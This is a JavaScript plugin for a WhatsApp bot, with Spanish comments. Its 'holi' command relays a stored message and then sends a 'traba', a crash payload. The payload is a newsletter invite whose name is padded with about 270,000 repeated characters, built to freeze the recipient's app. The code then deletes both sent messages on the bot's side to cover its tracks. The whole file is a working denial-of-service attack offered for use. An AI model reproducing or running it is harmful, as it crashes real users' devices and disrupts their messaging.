import fs from 'fs';

const FILE_PATH = './mensajes_guardados.json';

let handler = async (m, { conn }) => {
  try {
    // 1. Bloquear grupos
    if (m.isGroup) {
      return m.reply('❌ Este comando no puede usarse en grupos.');
    }

    // 2. Verificar que lo usa el número del bot
    const botNumber = conn.user?.jid || '';
    if (m.sender !== botNumber) {
      return m.reply('❌ Este comando solo puede usarlo el número vinculado al bot.');
    }

    // 3. Verificar que el archivo existe
    if (!fs.existsSync(FILE_PATH)) {
      return m.reply('❌ No hay mensaje guardado.');
    }

    const mensaje = JSON.parse(fs.readFileSync(FILE_PATH, 'utf-8'));

    if (!mensaje || !mensaje.message) {
      return m.reply('❌ El archivo está dañado o incompleto.');
    }

    // 4. Enviar mensaje guardado
    const enviado1 = await conn.relayMessage(m.chat, mensaje.message, {
      messageId: mensaje.key?.id || '',
    });

    // 5. Eliminar el mensaje guardado solo para el bot
    await conn.sendMessage(m.chat, {
      delete: {
        remoteJid: m.chat,
        fromMe: true,
        id: enviado1.key.id,
        participant: botNumber
      }
    });

    // 6. Crear traba tipo newsletter
    const travas = 'ꦾ'.repeat(90000);
    const mensaje2 = {
      newsletterAdminInviteMessage: {
        newsletterJid: "120363282786345717@newsletter",
        newsletterName: "🗣🗣🗣🗣" + travas + travas + travas,
        jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
        caption: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁",
        inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
      }
    };

    const enviado2 = await conn.relayMessage(m.chat, mensaje2, {});

    // 7. Eliminar también ese mensaje
    await conn.sendMessage(m.chat, {
      delete: {
        remoteJid: m.chat,
        fromMe: true,
        id: enviado2.key.id,
        participant: botNumber
      }
    });

    await conn.sendMessage(m.chat, {
      text: '😼 Enviado con éxito.'
    }, { quoted: m });

  } catch (e) {
    console.error('[ERROR enviarmsg]:', e);
    return m.reply('❌ Error:\n' + e.message);
  }
};

handler.command = ['holi'];
export default handler;